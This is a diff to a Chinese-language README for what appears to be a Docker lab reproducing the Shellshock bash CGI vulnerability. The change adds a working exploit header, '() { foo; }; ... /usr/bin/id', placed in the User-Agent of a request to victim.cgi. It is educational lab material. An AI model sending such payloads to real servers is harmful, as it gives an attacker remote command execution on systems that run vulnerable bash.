@@ -6,14 +6,15 @@
 docker-compose up -d
 ```
 
-访问`http://your-ip:8080/`，可见有两个文件：
+服务启动后，有两个页面`http://your-ip:8080/victim.cgi`和`http://your-ip:8080/safe.cgi`。其中safe.cgi是最新版bash生成的页面，victim.cgi是bash4.3生成的页面。
 
- - safe.cgi
- - victim.cgi
+将payload附在User-Agent中访问victim.cgi：
 
-其中safe.cgi是最新版bash生成的页面，victim.cgi是bash4.3生成的页面。
+```
+User-Agent: () { foo; }; echo Content-Type: text/plain; echo; /usr/bin/id
+```
 
-带上payload访问victim.cgi，命令成功被执行：
+命令成功被执行：
 
 ![](1.png)
 
